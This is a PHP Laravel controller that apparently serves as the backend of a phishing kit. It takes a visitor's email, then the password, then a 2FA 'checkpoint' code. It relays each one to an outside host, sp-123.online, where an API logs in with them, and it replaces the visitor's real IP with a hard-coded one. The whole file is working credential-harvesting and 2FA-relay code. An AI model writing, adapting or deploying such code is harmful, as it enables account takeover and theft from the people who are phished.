<?php

namespace App\Http\Controllers;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class MainController extends Controller
{
    public function index() {
        $date = Carbon::now();
        $date = Carbon::createFromFormat('Y-m-d H:i:s', $date);
        $date = $date->format('F j, Y');
        return view('index', compact('date'));
    }

    public function mail() {
        return view('email');
    }

    public function checkMail(Request $request) {
        $email = $request->email;
        $data = [
            'email' => $email,
            ];
        $result = $this->getDataApi('check-email', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {
            session()->put('email', $email);
            $data = [
                'email' => $email,
                'status' => $status
            ];
            return view('password', $data);

        } elseif ($status === 400) {
            $message = $result['message'];
            return view('email', compact('message'));
        }
    }

    public function changePass(Request $request) {
        $ip = $request->ip();
        $email = session()->get('email');
        $password = $request->get('password');


        $data = [
            'email' => $email,
            'password' => $password,
            'ip' => '183.80.56.11',
        ];
        // Gửi request POST đến API
        $result = $this->getDataApi('auth', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {
            $data = [
                'email' => $email,
                'status' => $status
            ];
            return view('checkpoint');
        } elseif ($status === 400) {
            $message = $result['message'];

            return view('password', compact('message'));
        }

    }

    public function check2FA(Request $request) {
        $email = session()->get('email');
        $twofaCode = $request->get('code');

        $data = [
            'email' => $email,
            'twofa_code' => $twofaCode
        ];

        // Gửi request POST đến API
        $result = $this->getDataApi('login_with_2fa', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {
            return view('success');
        } elseif ($status === 400) {
            $message = $result['message'];
            return view('checkpoint', compact('message'));
        }
    }

    public function getDataApi($url, $data)
    {
        $response = Http::post('https://api-v7.sp-123.online/' . $url, $data);
        $result = $response->json();
        return $result;
    }
}
